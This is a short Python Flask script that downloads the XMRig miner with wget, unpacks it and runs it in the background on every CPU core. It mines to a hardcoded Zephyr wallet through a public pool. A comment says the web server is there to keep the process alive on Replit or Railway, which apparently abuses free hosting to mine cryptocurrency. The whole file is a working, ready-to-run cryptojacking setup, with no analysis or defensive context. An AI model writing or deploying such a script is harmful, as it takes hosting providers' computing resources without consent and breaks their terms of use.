import os
import subprocess
from flask import Flask
import threading

app = Flask(__name__)

# CONFIG
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"
POOL = "fr.zephyr.herominers.com:1123"
ALGO = "rx/0"
PASS = "web"

def install_and_run_miner():
    os.makedirs("miner", exist_ok=True)
    os.chdir("miner")

    if not os.path.exists("xmrig"):
        print("[*] Downloading XMRig...")
        os.system("wget -q https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz")
        os.system("tar -xf xmrig-6.24.0-linux-static-x64.tar.gz")
        os.system("mv xmrig-6.24.0/xmrig ./")
        os.system("chmod +x xmrig")
    
    threads = os.cpu_count() or 1
    print(f"[*] Starting XMRig with {threads} threads...")
    subprocess.Popen([
        "./xmrig",
        "-a", ALGO,
        "-o", POOL,
        "-u", WALLET,
        "-p", PASS,
        "--threads", str(threads),
        "--cpu-priority", "5"
    ])

@app.route('/')
def home():
    return "XMRig Miner Running in Background"

if __name__ == '__main__':
    # Launch mining in background
    t = threading.Thread(target=install_and_run_miner)
    t.start()

    # Keep server alive for Replit or Railway
    app.run(host='0.0.0.0', port=8080)
